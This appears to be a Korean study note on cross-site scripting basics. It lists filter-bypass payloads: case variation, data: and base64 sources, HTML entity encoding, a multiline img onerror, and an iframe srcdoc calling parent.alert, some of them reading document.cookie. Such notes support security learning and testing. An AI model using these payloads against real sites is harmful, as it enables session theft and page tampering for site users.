---
title: "xss basic"
tags: ["basic theory", xss]
categories: [xss]
---

## **xss 기초**

xss의 핵심은 script를 삽입하여 이를 실행 가능한지 여부가 중요하다고 생각됩니다. HTML에서 script를 포함하기 위한 태그로는 기본적으로 \<script\> 태그만 알고 있었는데 이외에도 event handler를 사용하여도 가능하다는 것을 알 수 있었습니다.

### 여러 가지 우회 방법

> 잘못된 정규표현식

- 대소문자 구분이 있을 경우
```
script를 필터링 할 경우 Script, SCRIPT, ScRiPt와 같이 우회 가능
```

- script 태그 내에 데이터가 존재하는지 확인할 경우
```
src=data:,alert(document.cookie)와 같이 src 속성을 이용한 데이터 입력
```

- 특정 문자열을 필터링 할 경우
```
src=data:;base64,YWxlcnQgKGRvY3VtZW50LmNvb2tpZSk7와 같이 base64 encoding을 이용하여 우회 가능
혹은 &#114; 와 같이 중간에 html number entity encoding을 사용하여 우회 가능
```

- 멀티라인 검증이 없을 경우
```
<img src=""
onerror=alert(document.cookie) /> 와 같이 우회 가능
```

- iframe 사용 시 주의 사항
```xml
iframe을 사용하여 xss payload를 전달할 경우 해당 payload가 iframe 안에서 호출되기 때문에 상위 문서에 영향을 주기 위해서는 alert이 아닌 parent.alert을 사용하여야 합니다.
<iframe srcdoc='<img src=about: o&#110;error=parent.alert(document.domain)>'></iframe>
혹은 alert은 유지하고 parent.document.domain과 같은 방식을 사용하여도 동일합니다.
```

* * *


